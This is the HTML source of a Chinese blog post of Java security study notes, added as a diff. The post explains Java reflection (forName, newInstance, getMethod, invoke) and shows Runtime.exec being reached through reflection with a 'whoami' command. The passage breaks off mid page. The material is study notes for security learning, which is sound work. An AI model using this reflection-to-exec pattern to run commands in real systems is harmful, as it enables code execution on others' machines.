@@ -1,0 +1,1467 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="反射 Java中对象可以通过反射获取他的类，类可以通过反射拿到所有方法（包括私有），拿到的方法可以调用，总之通过“反射”，我们可以将Java这种静态语言附加上动态特性。（P神的定义）  反射中几位重要的方法 获取类的方法：forname 实例化类对象的方法：newInstance 获取函数的方法：getMethod 执行函数的方法：invoke  获取类的三种方式 obj.getClass() 如">
+<meta name="keywords" content="java安全漫谈,java安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全学习笔记（一）">
+<meta property="og:url" content="https://fanygit.github.io/2021/11/02/Java安全学习笔记（一）/index.html">
+<meta property="og:site_name" content="Fan的小酒馆">
+<meta property="og:description" content="反射 Java中对象可以通过反射获取他的类，类可以通过反射拿到所有方法（包括私有），拿到的方法可以调用，总之通过“反射”，我们可以将Java这种静态语言附加上动态特性。（P神的定义）  反射中几位重要的方法 获取类的方法：forname 实例化类对象的方法：newInstance 获取函数的方法：getMethod 执行函数的方法：invoke  获取类的三种方式 obj.getClass() 如">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==">
+<meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==">
+<meta property="og:updated_time" content="2021-11-18T12:17:28.888Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Java安全学习笔记（一）">
+<meta name="twitter:description" content="反射 Java中对象可以通过反射获取他的类，类可以通过反射拿到所有方法（包括私有），拿到的方法可以调用，总之通过“反射”，我们可以将Java这种静态语言附加上动态特性。（P神的定义）  反射中几位重要的方法 获取类的方法：forname 实例化类对象的方法：newInstance 获取函数的方法：getMethod 执行函数的方法：invoke  获取类的三种方式 obj.getClass() 如">
+<meta name="twitter:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://fanygit.github.io/2021/11/02/Java安全学习笔记（一）/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  
+  <title>Java安全学习笔记（一） | Fan的小酒馆</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Fan的小酒馆</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-playlist">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/playlist/" rel="section"><i class="menu-item-icon fa fa-fw fa-music"></i> <br>歌单</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://fanygit.github.io/2021/11/02/Java安全学习笔记（一）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Fany">
+      <meta itemprop="description" content="千里之行，始于足下。">
+      <meta itemprop="image" content="/images/tx5.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Fan的小酒馆">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Java安全学习笔记（一）
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2021-11-02 16:00:00" itemprop="dateCreated datePublished" datetime="2021-11-02T16:00:00+08:00">2021-11-02</time>
+            </span>
+          
+
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2021-11-18 20:17:28" itemprop="dateModified" datetime="2021-11-18T20:17:28+08:00">2021-11-18</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Java/Java安全/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          
+
+          
+            
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="fa fa-comment-o"></i>
+    </span>
+    
+      <span class="post-meta-item-text">评论数：</span>
+    
+  
+    <a href="/2021/11/02/Java安全学习笔记（一）/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/11/02/Java安全学习笔记（一）/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><blockquote>
+<p>Java中对象可以通过反射获取他的类，类可以通过反射拿到所有方法（包括私有），拿到的方法可以调用，总之通过“反射”，我们可以将Java这种静态语言附加上动态特性。（P神的定义）</p>
+</blockquote>
+<h4 id="反射中几位重要的方法"><a href="#反射中几位重要的方法" class="headerlink" title="反射中几位重要的方法"></a>反射中几位重要的方法</h4><ul>
+<li>获取类的方法：<code>forname</code></li>
+<li>实例化类对象的方法：<code>newInstance</code></li>
+<li>获取函数的方法：<code>getMethod</code></li>
+<li>执行函数的方法：<code>invoke</code></li>
+</ul>
+<h4 id="获取类的三种方式"><a href="#获取类的三种方式" class="headerlink" title="获取类的三种方式"></a>获取类的三种方式</h4><ul>
+<li><p><code>obj.getClass()</code> 如果上下文中存在某个类的实例<code>obj</code>，那么我们可以直接通过<code>obj.getClass()</code>来获取它的类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        System.out.println(runtime.getClass());</span><br><span class="line"><span class="comment">// class java.lang.Runtime</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p><code>Test.class</code> 如果你已经加载了某个类，只是想获取到它的 <code>java.lang.Class</code> 对象，那么就直接 拿它的 class 属性即可。这个⽅法其实不属于反射。</p>
+</li>
+<li><p><code>Class.forName</code> 如果你知道某个类的名字，想获取到这个类，就可以使⽤ <code>forName</code> 来获取</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">        System.out.println(clazz);</span><br><span class="line"><span class="comment">// class java.lang.Runtime</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h4 id="使用newInstance不成功的一些原因"><a href="#使用newInstance不成功的一些原因" class="headerlink" title="使用newInstance不成功的一些原因"></a>使用<code>newInstance</code>不成功的一些原因</h4><ol>
+<li>你使用的类没有无参构造函数</li>
+<li>你使用的类构造函数是私有的</li>
+</ol>
+<p>案例</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">clazz.getMethod(<span class="string">"exec"</span>, String.class).invoke(clazz.newInstance(), <span class="string">"whoami"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>会报错<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20211102162734720.png" 